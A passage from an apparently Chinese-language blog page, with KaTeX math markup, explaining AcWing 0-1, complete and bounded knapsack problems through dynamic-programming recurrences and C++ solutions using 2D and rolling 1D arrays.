style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>i</mi></msub><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">0\lt v_i, w_i \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>输入样例</strong></p><pre><code>4 51 22 43 44 5</code></pre><p><strong>输出样例：</strong></p><pre><code>8</code></pre><h3 id="二维dp数组">二维dp数组</h3><ul><li>状态计算 <code>f[i][j] = max(f[i - 1][j], f[i- 1][j - v[i]] + w[i])</code><ul><li>以是否包含物品i进行分类</li><li>不含i <code>f[i - 1][j]</code></li><li>含i <code>f[i- 1][j - v[i]] + w[i]</code></li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span>  <span class="comment">// max()需要</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m, v[kN], w[kN];</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;v[i], &amp;w[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      f[i][j] = f[i - <span class="number">1</span>][j];</span><br><span class="line">      <span class="keyword">if</span> (j &gt;= v[i]) &#123;</span><br><span class="line">        f[i][j] = <span class="built_in">max</span>(f[i][j], f[i - <span class="number">1</span>][j - v[i]] + w[i]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[n][m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="代码层优化：一维dp数组">代码层优化：一维dp数组</h3><blockquote><p>DP的优化很多是在代码层面的，而非算法层面。</p></blockquote><p><code>f[i][j] = max(f[i - 1][j], f[i - 1][j - v[i]] + w[i])</code> 计算时只用到了上一层的信息，可用<strong>滚动数组</strong>优化。</p><p>由于<code>f[i - 1][j - v[i]]</code>使用到的是<code>i - 1</code>层信息，所以<mark>体积必须从大到小遍历</mark>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m, v[kN], w[kN];</span><br><span class="line"><span class="type">int</span> f[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;v[i], &amp;w[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= v[i]; j--) &#123;  <span class="comment">// 不要到0</span></span><br><span class="line">      f[j] = <span class="built_in">max</span>(f[j], f[j - v[i]] + w[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-3-完全背包问题"><a href="https://www.acwing.com/problem/content/3/">AcWing 3. 完全背包问题</a></h2><p><code>难度：简单</code></p><p>有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 种物品和一个容量是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span> 的背包，每种物品都有无限件可用。</p><p>第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 种物品的体积是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，价值是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">w_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>求解将哪些物品装入背包，可使这些物品的总体积不超过背包容量，且总价值最大。<br>输出最大价值。</p><p><strong>输入格式</strong></p><p>第一行两个整数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mtext>，</mtext><mi>V</mi></mrow><annotation encoding="application/x-tex">N，V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span>，用空格隔开，分别表示物品种数和背包容积。</p><p>接下来有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 行，每行两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_i, w_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，用空格隔开，分别表示第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 种物品的体积和价值。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示最大价值。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>N</mi><mo separator="true">,</mo><mi>V</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">0 \lt N, V \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>i</mi></msub><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">0 \lt v_i, w_i \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>输入样例</strong></p><pre><code>4 51 22 43 44 5</code></pre><p><strong>输出样例：</strong></p><pre><code>10</code></pre><h3 id="二维dp数组-2">二维dp数组</h3><ul><li><p>状态计算 <code>f[i][j] = max(f[i - 1][j], f[i][j - v[i] + w[i]) </code></p><ul><li><p>按照物品i选择多次进行分类</p></li><li><p>物品i选k次 <code>f[i - 1][j - k*v[i]] + k*w[i], k = 0,1,.. </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">由于</span><br><span class="line">f[i][j] = max(f[i-1][j], f[i-1][j-v]+w, f[i-1][j-2v]+2w, ...)</span><br><span class="line">f[i][j-v] = max(         f[i-1][j-v],   f[i-1][j-2v]+2w, ...)</span><br><span class="line">所以 f[i][j] = max(f[i-1][j], f[i][j-v] + w) </span><br><span class="line">！与0-1背包问题不同的是 f[i-1][j-v]和f[i][j-v]</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m, v[kN], w[kN];</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;v[i], &amp;w[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      f[i][j] = f[i - <span class="number">1</span>][j];</span><br><span class="line">      <span class="keyword">if</span> (j &gt;= v[i]) &#123;</span><br><span class="line">        f[i][j] = <span class="built_in">max</span>(f[i][j], f[i][j - v[i]] + w[i]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[n][m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一维度dp数组">一维度dp数组</h3><p>由于<code>f[i][j - v[i]]</code>使用到的是<code>i </code>层信息，所以<mark>体积必须从小到大遍历</mark>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m, v[kN], w[kN];</span><br><span class="line"><span class="type">int</span> f[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;v[i], &amp;w[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = v[i]; j &lt;= m; j++) &#123;  <span class="comment">// 不要从0开始</span></span><br><span class="line">      f[j] = <span class="built_in">max</span>(f[j], f[j - v[i]] + w[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-4-多重背包问题-I"><a href="https://www.acwing.com/problem/content/4/">AcWing 4. 多重背包问题 I</a></h2><p><code>难度：简单</code></p><p>有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 种物品和一个容量是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span> 的背包。</p><p>第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 种物品最多有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi mathvariant="normal">_</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">s\_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal">s</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span></span></span></span> 件，每件体积是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi mathvariant="normal">_</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">v\_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span></span></span></span>，价值是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi><mi mathvariant="normal">_</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">w\_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span></span></span></span>。</p><p>求解将哪些物品装入背包，可使物品体积总和不超过背包容量，且价值总和最大。<br>输出最大价值。</p><p><strong>输入格式</strong></p><p>第一行两个整数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mtext>，</mtext><mi>V</mi></mrow><annotation encoding="application/x-tex">N，V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span>，用空格隔开，分别表示物品种数和背包容积。</p><p>接下来有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 行，每行三个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi mathvariant="normal">_</mi><mi>i</mi><mo separator="true">,</mo><mi>w</mi><mi mathvariant="normal">_</mi><mi>i</mi><mo separator="true">,</mo><mi>s</mi><mi mathvariant="normal">_</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">v\_i, w\_i, s\_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">s</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span></span></span></span>，用空格隔开，分别表示第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 种物品的体积、价值和数量。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示最大价值。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>N</mi><mo separator="true">,</mo><mi>V</mi><mo>≤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">0 \lt N, V \le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>v</mi><mi mathvariant="normal">_</mi><mi>i</mi><mo separator="true">,</mo><mi>w</mi><mi mathvariant="normal">_</mi><mi>i</mi><mo separator="true">,</mo><mi>s</mi><mi 